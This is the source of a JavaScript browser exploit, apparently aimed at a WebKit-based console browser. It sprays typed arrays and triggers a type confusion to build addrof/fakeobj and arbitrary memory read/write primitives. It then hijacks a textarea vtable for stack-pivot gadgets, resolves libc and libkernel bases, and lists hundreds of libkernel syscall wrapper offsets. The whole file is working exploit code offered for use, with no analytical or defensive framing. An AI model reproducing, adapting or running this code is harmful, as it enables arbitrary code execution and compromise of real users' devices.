//for addrof&fakeobj
var leaker_obj = {a: 0};
var leaker_arr = new Uint32Array(6);

//for arbitrary r/w
var oob_slave = new Uint8Array(1024);
var oob_master = new Uint32Array(7);

var spray = [];
var SPRAY_BATCH_SIZE = 1000;
var MAX_SPRAY_SIZE = 0x8000; // Reduced from 0x10000 for WebKit safety

function spray_one()
{
    var x = new Uint32Array(1);
    x[spray.length+'spray'] = 123;
    spray.push(x);
}

function progressive_spray() {
    // Progressive spraying to avoid memory spikes
    var total_sprayed = 0;
    while(total_sprayed < MAX_SPRAY_SIZE) {
        var batch_size = Math.min(SPRAY_BATCH_SIZE, MAX_SPRAY_SIZE - total_sprayed);
        
        // Spray a batch
        for(var i = 0; i < batch_size; i++) {
            spray_one();
        }
        
        total_sprayed += batch_size;
        
        // Give browser time to handle memory management
        if(total_sprayed % (SPRAY_BATCH_SIZE * 4) === 0) {
            // Force garbage collection hint for WebKit
            if(typeof gc === 'function') {
                gc();
            }
        }
    }
}

//spray Uint32Arrays progressively
progressive_spray();

//5678 is the length, see the original exploit for explanation of a
var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678};
//crash if this second target is not present. not used anywhere, try removing if it crashes
var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678};

var impl_idx = 0;
var object_pool = []; // Pool of reusable objects
var pool_size = 0;

function get_pooled_object() {
    if(pool_size > 0) {
        return object_pool[--pool_size];
    }
    return {};
}

function return_to_pool(obj) {
    if(pool_size < 100) { // Limit pool size to prevent memory bloat
        // Clear object properties for reuse
        for(var prop in obj) {
            if(obj.hasOwnProperty(prop) && prop !== 'a') {
                delete obj[prop];
            }
        }
        object_pool[pool_size++] = obj;
    }
}

//type-confused with WTF::StringImpl
function create_impl()
{
    var ans = {a: target}; //a is type-confused with m_hashAndFlags
    for(var i = 0; i < 32; i++)
        ans[(impl_idx++)+'x'] = get_pooled_object();
    return ans;
}

var exploit_success = false;
var iteration_times = [];

function adaptive_delay(iteration) {
    // Add small delays for WebKit stability, especially on slower systems
    if(iteration % 100 === 0 && iteration > 0) {
        var avg_time = iteration_times.reduce((a, b) => a + b, 0) / iteration_times.length;
        if(avg_time > 10) { // If iterations are taking too long
            // Small delay to prevent overwhelming WebKit
            var start = Date.now();
            while(Date.now() - start < 1) {} // 1ms delay
        }
    }
}

function cleanup_iteration_objects(impl, s) {
    // Return objects to pool for reuse
    if(impl && impl.a === target) {
        for(var prop in impl) {
            if(prop !== 'a' && impl.hasOwnProperty(prop)) {
                return_to_pool(impl[prop]);
            }
        }
    }
    impl = null;
    s = null;
}

function trigger(x)
{
    if(impl.a != target)
    {
        while(1);
    }
    var o = {a: 1}; //a is type-confused with m_impl
    for(var i in o)
    {
        {
            i = x;
            function i(){}
        }
        o[i]; //this sets bit 4 (|= 16) in m_hashAndFlags
    }
    if(impl.a != target)
    {
        target.c = leaker_obj;
        leaker_obj.a = leaker_obj;
        var l1 = impl.a[4];
        var l2 = impl.a[5];
        leaker_obj.a = oob_slave;
        var s1 = impl.a[4];
        var s2 = impl.a[5];
        target.c = leaker_arr;
        impl.a[4] = l1;
        impl.a[5] = l2;
        target.c = oob_master;
        impl.a[4] = s1;
        impl.a[5] = s2;
        impl.a = target;
        exploit_success = true;
        throw "exploit fucking finished";
    }
}

try
{
    var max_iterations = 800; // Reduced from 1024 for better performance
    var batch_size = 50; // Process in smaller batches
    
    for(var _ = 0; _ < max_iterations; _++)
    {
        var iter_start = Date.now();
        
        var impl = create_impl(); //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
        var s = {a: impl};
        trigger(s);
        
        var iter_time = Date.now() - iter_start;
        iteration_times.push(iter_time);
        
        // Keep only recent timing data
        if(iteration_times.length > 100) {
            iteration_times.shift();
        }
        
        // Cleanup and adaptive delay
        cleanup_iteration_objects(impl, s);
        adaptive_delay(_);
        
        // Batch cleanup every 50 iterations
        if(_ % batch_size === 0 && _ > 0) {
            if(typeof gc === 'function') {
                gc(); // Force garbage collection
            }
        }
        
        // Early termination if exploit succeeds
        if(exploit_success) {
            break;
        }
    }
}
catch(e)
{
    // Final cleanup
    if(typeof gc === 'function') {
        gc();
    }
}

function i48_put(x, a) {
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
}

function i48_get(a) {
    return a[4] + a[5] * 4294967296;
}

function addrof(x) {
    leaker_obj.a = x;
    return i48_get(leaker_arr);
}

function fakeobj(x) {
    i48_put(x, leaker_arr);
    return leaker_obj.a;
}

function read_mem_setup(p, sz) {
    i48_put(p, oob_master);
    oob_master[6] = sz;
}

function read_mem(p, sz) {
    read_mem_setup(p, sz);
    var arr = new Array(sz);
    for (var i = 0; i < sz; i++)
        arr[i] = oob_slave[i];
    return arr;
}

function read_mem_s(p, sz) {
    read_mem_setup(p, sz);
    return "" + oob_slave;
}

function read_mem_b(p, sz) {
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b;
}

function read_mem_as_string(p, sz) {
    var x = read_mem_b(p, sz);
    var chars = new Array(x.length);
    for (var i = 0; i < x.length; i++)
        chars[i] = String.fromCharCode(x[i]);
    return chars.join('');
}

function write_mem(p, data) {
    i48_put(p, oob_master);
    oob_master[6] = data.length;
    oob_slave.set(data);
}

function read_ptr_at(p) {
    var d = read_mem(p, 8);
    var ans = 0;
    var multiplier = 1;
    for (var i = 0; i < 8; i++) {
        ans += d[i] * multiplier;
        multiplier *= 256;
    }
    return ans;
}

function write_ptr_at(p, d) {
    var arr = new Array(8);
    for (var i = 0; i < 8; i++) {
        arr[i] = d & 0xff;
        d = (d - arr[i]) / 256;
    }
    write_mem(p, arr);
}

function hex(x) {
    return (new Number(x)).toString(16);
}

var malloc_nogc = [];

function malloc(sz) {
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr) + 0x10);
}

var tarea = document.createElement('textarea');
var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));

var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);

var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx) {
    var p = plt_ptr + (idx << 4);
    var q = read_mem(p, 6);
    if (q[0] !== 0xff || q[1] !== 0x25)
        throw "invalid GOT entry";
    var offset = q[2] + (q[3] << 8) + (q[4] << 16) + (q[5] << 24);
    return read_ptr_at(offset + p + 6);
}

var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705) - 0x10000;
var libc_base = get_got_addr(582);

var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

function saveall() {
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable + 0x1d8);
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans;
}

function pivot(buf) {
    var ans = malloc(0x400);
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr + 0x38, buf);
    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
    write_ptr_at(buf, ans);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}

var aio_init_addr = libkernel_base + 0x1efc0,
    fpathconf_addr = libkernel_base + 0x1efe0,
    dmem_container_addr = libkernel_base + 0x1f000,
    evf_clear_addr = libkernel_base + 0x1f020,
    kqueue_addr = libkernel_base + 0x1f040,
    kevent_addr = libkernel_base + 0x1f060,
    futimes_addr = libkernel_base + 0x1f080,
    open_addr = libkernel_base + 0x1f0a0,
    thr_self_addr = libkernel_base + 0x1f0c0,
    mkdir_addr = libkernel_base + 0x1f0e0,
    pipe_addr = libkernel_base + 0x1f100,
    stat_addr = libkernel_base + 0x1f130,
    write_addr = libkernel_base + 0x1f150,
    evf_cancel_addr = libkernel_base + 0x1f170,
    ktimer_delete_addr = libkernel_base + 0x1f190,
    setregid_addr = libkernel_base + 0x1f1b0,
    jitshm_create_addr = libkernel_base + 0x1f1d0,
    sigwait_addr = libkernel_base + 0x1f1f0,
    fdatasync_addr = libkernel_base + 0x1f210,
    sigtimedwait_addr = libkernel_base + 0x1f230,
    get_gpo_addr = libkernel_base + 0x1f250,
    sched_setscheduler_addr = libkernel_base + 0x1f270,
    osem_open_addr = libkernel_base + 0x1f290,
    dynlib_get_info_addr = libkernel_base + 0x1f2b0,
    osem_post_addr = libkernel_base + 0x1f2e0,
    blockpool_move_addr = libkernel_base + 0x1f300,
    issetugid_addr = libkernel_base + 0x1f320,
    getdents_addr = libkernel_base + 0x1f340,
    rtprio_thread_addr = libkernel_base + 0x1f360,
    evf_delete_addr = libkernel_base + 0x1f380,
    _umtx_op_addr = libkernel_base + 0x1f3a0,
    access_addr = libkernel_base + 0x1f3c0,
    reboot_addr = libkernel_base + 0x1f3e0,
    sigaltstack_addr = libkernel_base + 0x1f400,
    getcontext_addr = libkernel_base + 0x1f424,
    munmap_addr = libkernel_base + 0x1f450,
    setuid_addr = libkernel_base + 0x1f470,
    evf_trywait_addr = libkernel_base + 0x1f490,
    setcontext_addr = libkernel_base + 0x1f4b0,
    dynlib_get_list_addr = libkernel_base + 0x1f4d0,
    setsid_addr = libkernel_base + 0x1f4f0,
    fstatfs_addr = libkernel_base + 0x1f510,
    aio_multi_wait_addr = libkernel_base + 0x1f530,
    accept_addr = libkernel_base + 0x1f550,
    set_phys_fmem_limit_addr = libkernel_base + 0x1f570,
    thr_get_name_addr = libkernel_base + 0x1f590,
    get_page_table_stats_addr = libkernel_base + 0x1f5b0,
    sigsuspend_addr = libkernel_base + 0x1f5d0,
    truncate_addr = libkernel_base + 0x1f5f0,
    fsync_addr = libkernel_base + 0x1f610,
    execve_addr = libkernel_base + 0x1f63d,
    evf_open_addr = libkernel_base + 0x1f660,
    netabort_addr = libkernel_base + 0x1f680,
    blockpool_unmap_addr = libkernel_base + 0x1f6a0,
    osem_create_addr = libkernel_base + 0x1f6c0,
    getlogin_addr = libkernel_base + 0x1f6e0,
    mincore_addr = libkernel_base + 0x1f700,
    shutdown_addr = libkernel_base + 0x1f720,
    profil_addr = libkernel_base + 0x1f740,
    preadv_addr = libkernel_base + 0x1f760,
    geteuid_addr = libkernel_base + 0x1f780,
    set_chicken_switches_addr = libkernel_base + 0x1f7a0,
    sigqueue_addr = libkernel_base + 0x1f7c0,
    aio_multi_poll_addr = libkernel_base + 0x1f7e0,
    get_self_auth_info_addr = libkernel_base + 0x1f800,
    opmc_enable_addr = libkernel_base + 0x1f820,
    aio_multi_delete_addr = libkernel_base + 0x1f840,
    rfork_addr = libkernel_base + 0x1f869,
    sys_exit_addr = libkernel_base + 0x1f88a,
    blockpool_batch_addr = libkernel_base + 0x1f8b0,
    sigpending_addr = libkernel_base + 0x1f8d0,
    ktimer_gettime_addr = libkernel_base + 0x1f8f0,
    opmc_set_ctr_addr = libkernel_base + 0x1f910,
    ksem_wait_addr = libkernel_base + 0x1f930,
    sched_getparam_addr = libkernel_base + 0x1f950,
    swapcontext_addr = libkernel_base + 0x1f970,
    opmc_get_ctr_addr = libkernel_base + 0x1f990,
    budget_get_ptype_addr = libkernel_base + 0x1f9b0,
    msync_addr = libkernel_base + 0x1f9d0,
    sigwaitinfo_addr = libkernel_base + 0x1f9f0,
    lstat_addr = libkernel_base + 0x1fa10,
    test_debug_rwmem_addr = libkernel_base + 0x1fa30,
    evf_create_addr = libkernel_base + 0x1fa50,
    madvise_addr = libkernel_base + 0x1fa70,
    cpuset_getaffinity_addr = libkernel_base + 0x1fa90,
    evf_set_addr = libkernel_base + 0x1fab0,
    setlogin_addr = libkernel_base + 0x1fad0,
    ksem_init_addr = libkernel_base + 0x1fb00,
    opmc_disable_addr = libkernel_base + 0x1fb20,
    namedobj_delete_addr = libkernel_base + 0x1fb40,
    gettimeofday_addr = libkernel_base + 0x1fb60,
    read_addr = libkernel_base + 0x1fb80,
    thr_get_ucontext_addr = libkernel_base + 0x1fba0,
    batch_map_addr = libkernel_base + 0x1fbc0,
    sysarch_addr = libkernel_base + 0x1fbe0,
    utc_to_localtime_addr = libkernel_base + 0x1fc00,
    evf_close_addr = libkernel_base + 0x1fc20,
    setrlimit_addr = libkernel_base + 0x1fc40,
    getpeername_addr = libkernel_base + 0x1fc60,
    aio_get_data_addr = libkernel_base + 0x1fc80,
    lseek_addr = libkernel_base + 0x1fca0,
    connect_addr = libkernel_base + 0x1fcc0,
    recvfrom_addr = libkernel_base + 0x1fce0,
    getrlimit_addr = libkernel_base + 0x1fd00,
    dynlib_get_info_for_libdbg_addr = libkernel_base + 0x1fd20,
    thr_suspend_ucontext_addr = libkernel_base + 0x1fd40,
    _umtx_op_addr = libkernel_base + 0x1fd60,
    kill_addr = libkernel_base + 0x1fd70,
    dynlib_process_needed_and_relocate_addr = libkernel_base + 0x1fd90,
    getsockname_addr = libkernel_base + 0x1fdb0,
    osem_trywait_addr = libkernel_base + 0x1fdd0,
    execve_addr = libkernel_base + 0x1fdf0,
    flock_addr = libkernel_base + 0x1fe10,
    sigreturn_addr = libkernel_base + 0x1fe30,
    query_memory_protection_addr = libkernel_base + 0x1fe50,
    pwrite_addr = libkernel_base + 0x1fe70,
    get_map_statistics_addr = libkernel_base + 0x1fe90,
    ksem_getvalue_addr = libkernel_base + 0x1feb0,
    sendfile_addr = libkernel_base + 0x1fed0,
    socketex_addr = libkernel_base + 0x1fef0,
    unlink_addr = libkernel_base + 0x1ff10,
    thr_resume_ucontext_addr = libkernel_base + 0x1ff30,
    dl_get_list_addr = libkernel_base + 0x1ff50,
    cpuset_setaffinity_addr = libkernel_base + 0x1ff70,
    clock_gettime_addr = libkernel_base + 0x1ff90,
    thr_kill2_addr = libkernel_base + 0x1ffb0,
    set_timezone_info_addr = libkernel_base + 0x1ffd0,
    select_addr = libkernel_base + 0x1fff0,
    pselect_addr = libkernel_base + 0x20010,
    sync_addr = libkernel_base + 0x20030,
    socketpair_addr = libkernel_base + 0x20050,
    get_kernel_mem_statistics_addr = libkernel_base + 0x20070,
    virtual_query_all_addr = libkernel_base + 0x20090,
    physhm_open_addr = libkernel_base + 0x200b0,
    getuid_addr = libkernel_base + 0x200d0,
    revoke_addr = libkernel_base + 0x200f0,
    sigprocmask_addr = libkernel_base + 0x20113,
    setegid_addr = libkernel_base + 0x201a0,
    cpuset_getid_addr = libkernel_base + 0x201c0,
    evf_wait_addr = libkernel_base + 0x201e0,
    sched_get_priority_max_addr = libkernel_base + 0x20200,
    sigaction_addr = libkernel_base + 0x20220,
    ipmimgr_call_addr = libkernel_base + 0x20240,
    aio_submit_cmd_addr = libkernel_base + 0x20260,
    free_stack_addr = libkernel_base + 0x20280,
    settimeofday_addr = libkernel_base + 0x202a0,
    recvmsg_addr = libkernel_base + 0x202c0,
    aio_submit_addr = libkernel_base + 0x202e0,
    setgroups_addr = libkernel_base + 0x20300,
    aio_multi_cancel_addr = libkernel_base + 0x20320,
    nanosleep_addr = libkernel_base + 0x20340,
    blockpool_map_addr = libkernel_base + 0x20360,
    thr_create_addr = libkernel_base + 0x20380,
    munlockall_addr = libkernel_base + 0x203a0,
    dynlib_get_info_ex_addr = libkernel_base + 0x203c0,
    pwritev_addr = libkernel_base + 0x203e0,
    mname_addr = libkernel_base + 0x20400,
    regmgr_call_addr = libkernel_base + 0x20420,
    getgroups_addr = libkernel_base + 0x20440,
    osem_close_addr = libkernel_base + 0x20460,
    osem_delete_addr = libkernel_base + 0x20480,
    dynlib_get_obj_member_addr = libkernel_base + 0x204a0,
    debug_init_addr = libkernel_base + 0x204c0,
    mmap_dmem_addr = libkernel_base + 0x204e0,
    kldunloadf_addr = libkernel_base + 0x20500,
    mprotect_addr = libkernel_base + 0x20520,
    ksem_trywait_addr = libkernel_base + 0x205f0,
    ksem_close_addr = libkernel_base + 0x20610,
    sched_rr_get_interval_addr = libkernel_base + 0x20630,
    getitimer_addr = libkernel_base + 0x20650,
    getpid_addr = libkernel_base + 0x20670,
    netgetsockinfo_addr = libkernel_base + 0x20690,
    get_cpu_usage_all_addr = libkernel_base + 0x206b0,
    eport_delete_addr = libkernel_base + 0x206d0,
    randomized_path_addr = libkernel_base + 0x206f0,
    jitshm_alias_addr = libkernel_base + 0x20710,
    seteuid_addr = libkernel_base + 0x20730,
    set_uevt_addr = libkernel_base + 0x20750,
    clock_getres_addr = libkernel_base + 0x20770,
    setitimer_addr = libkernel_base + 0x20790,
    thr_exit_addr = libkernel_base + 0x207b0,
    sandbox_path_addr = libkernel_base + 0x207d0,
    thr_kill_addr = libkernel_base + 0x207f0,
    sys_exit_addr = libkernel_base + 0x20810,
    dup2_addr = libkernel_base + 0x20830,
    utimes_addr = libkernel_base + 0x20850,
    pread_addr = libkernel_base + 0x20870,
    dl_get_info_addr = libkernel_base + 0x20890,
    ktimer_settime_addr = libkernel_base + 0x208b0,
    sched_setparam_addr = libkernel_base + 0x208d0,
    aio_create_addr = libkernel_base + 0x208f0,
    osem_wait_addr = libkernel_base + 0x20910,
    dynlib_get_list_for_libdbg_addr = libkernel_base + 0x20930,
    get_proc_type_info_addr = libkernel_base + 0x20950,
    getgid_addr = libkernel_base + 0x20970,
    fstat_addr = libkernel_base + 0x20990,
    fork_addr = libkernel_base + 0x209b0,
    namedobj_create_addr = libkernel_base + 0x209d0,
    opmc_set_ctl_addr = libkernel_base + 0x209f0,
    get_resident_count_addr = libkernel_base + 0x20a10,
    getdirentries_addr = libkernel_base + 0x20a30,
    getrusage_addr = libkernel_base + 0x20a50,
    setreuid_addr = libkernel_base + 0x20a70,
    wait4_addr = libkernel_base + 0x20a90,
    __sysctl_addr = libkernel_base + 0x20ab0,
    bind_addr = libkernel_base + 0x20ad0,
    sched_yield_addr = libkernel_base + 0x20af0,
    dl_get_metadata_addr = libkernel_base + 0x20b10,
    get_resident_fmem_count_addr = libkernel_base + 0x20b30,
    setsockopt_addr = libkernel_base + 0x20b50,
    dynlib_load_prx_addr = libkernel_base + 0x20b70,
    getpriority_addr = libkernel_base + 0x20b90,
    get_phys_page_size_addr = libkernel_base + 0x20bb0,
    opmc_set_hw_addr = libkernel_base + 0x20bd0,
    dynlib_do_copy_relocations_addr = libkernel_base + 0x20bf0,
    netcontrol_addr = libkernel_base + 0x20c10,
    ksem_post_addr = libkernel_base + 0x20c30,
    netgetiflist_addr = libkernel_base + 0x20c50,
    chmod_addr = libkernel_base + 0x20c70,
    aio_suspend_addr = libkernel_base + 0x20c90,
    ksem_timedwait_addr = libkernel_base + 0x20cb0,
    dynlib_dlsym_addr = libkernel_base + 0x20cd0,
    get_paging_stats_of_all_objects_addr = libkernel_base + 0x20cf0,
    osem_cancel_addr = libkernel_base + 0x20d10,
    writev_addr = libkernel_base + 0x20d30,
    ktimer_getoverrun_addr = libkernel_base + 0x20d50,
    rmdir_addr = libkernel_base + 0x20d70,
    sched_get_priority_min_addr = libkernel_base + 0x20d90,
    dynlib_unload_prx_addr = libkernel_base + 0x20db0,
    thr_set_name_addr = libkernel_base + 0x20dd0,
    mlockall_addr = libkernel_base + 0x20df0,
    openat_addr = libkernel_base + 0x20e10,
    eport_open_addr = libkernel_base + 0x20e30,
    sigprocmask_addr = libkernel_base + 0x20e50,
    chdir_addr = libkernel_base + 0x20e70,
    physhm_unlink_addr = libkernel_base + 0x20e90,
    mtypeprotect_addr = libkernel_base + 0x20eb0,
    thr_wake_addr = libkernel_base + 0x20ed0,
    blockpool_open_addr = libkernel_base + 0x20ef0,
    thr_new_addr = libkernel_base + 0x20f10,
    munlock_addr = libkernel_base + 0x20f30,
    fchflags_addr = libkernel_base + 0x20f50,
    ftruncate_addr = libkernel_base + 0x20f70,
    rename_addr = libkernel_base + 0x20f90,
    poll_addr = libkernel_base + 0x20fb0,
    eport_trigger_addr = libkernel_base + 0x20fd0,
    getsid_addr = libkernel_base + 0x20ff0,
    virtual_query_addr = libkernel_base + 0x21010,
    fchmod_addr = libkernel_base + 0x21030,
    _umtx_unlock_addr = libkernel_base + 0x21050,
    mmap_addr = libkernel_base + 0x21070,
    ktimer_create_addr = libkernel_base + 0x21090,
    dup_addr = libkernel_base + 0x210b0,
    sendmsg_addr = libkernel_base + 0x210d0,
    close_addr = libkernel_base + 0x210f0,
    is_development_mode_addr = libkernel_base + 0x21110,
    getegid_addr = libkernel_base + 0x21130,
    get_vm_map_timestamp_addr = libkernel_base + 0x21150,
    dynlib_get_proc_param_addr = libkernel_base + 0x21170,
    fcntl_addr = libkernel_base + 0x21190,
    getppid_addr = libkernel_base + 0x211b0,
    readv_addr = libkernel_base + 0x211d0,
    rdup_addr = libkernel_base + 0x211f0,
    listen_addr = libkernel_base + 0x21210,
    app_state_change_addr = libkernel_base + 0x21230,
    set_gpo_addr = libkernel_base + 0x21250,
    ksem_unlink_addr = libkernel_base + 0x21270,
    get_cpu_usage_proc_addr = libkernel_base + 0x21290,
    shm_unlink_addr = libkernel_base + 0x212b0,
    reserve_2mb_page_addr = libkernel_base + 0x212d0,
    dynlib_get_info2_addr = libkernel_base + 0x212f0,
    mlock_addr = libkernel_base + 0x21310,
    workaround8849_addr = libkernel_base + 0x21330,
    get_sdk_compiled_version_addr = libkernel_base + 0x21350,
    clock_settime_addr = libkernel_base + 0x21370,
    ksem_destroy_addr = libkernel_base + 0x21390,
    ksem_open_addr = libkernel_base + 0x213b0,
    thr_set_ucontext_addr = libkernel_base + 0x213d0,
    get_bio_usage_all_addr = libkernel_base + 0x213f0,
    getdtablesize_addr = libkernel_base + 0x21410,
    chflags_addr = libkernel_base + 0x21430,
    shm_open_addr = libkernel_base + 0x21450,
    eport_close_addr = libkernel_base + 0x21470,
    dynlib_get_list2_addr = libkernel_base + 0x21490,
    socketclose_addr = libkernel_base + 0x214b0,
    sched_getscheduler_addr = libkernel_base + 0x214d0,
    pathconf_addr = libkernel_base + 0x214f0,
    localtime_to_utc_addr = libkernel_base + 0x21510,
    setpriority_addr = libkernel_base + 0x21530,
    cpumode_yield_addr = libkernel_base + 0x21550,
    process_terminate_addr = libkernel_base + 0x21570,
    ioctl_addr = libkernel_base + 0x21590,
    opmc_get_hw_addr = libkernel_base + 0x215b0,
    eport_create_addr = libkernel_base + 0x215d0,
    socket_addr = libkernel_base + 0x215f0,
    _umtx_lock_addr = libkernel_base + 0x21610,
    thr_suspend_addr = libkernel_base + 0x21630,
    is_in_sandbox_addr = libkernel_base + 0x21650,
    get_authinfo_addr = libkernel_base + 0x21670,
    mdbg_service_addr = libkernel_base + 0x21690,
    getsockopt_addr = libkernel_base + 0x216b0,
    get_paging_stats_of_all_threads_addr = libkernel_base + 0x216d0,
    adjtime_addr = libkernel_base + 0x216f0,
    kqueueex_addr = libkernel_base + 0x21710,
    uuidgen_addr = libkernel_base + 0x21730,
    set_vm_container_addr = libkernel_base + 0x21750,
    sendto_addr = libkernel_base + 0x21770;
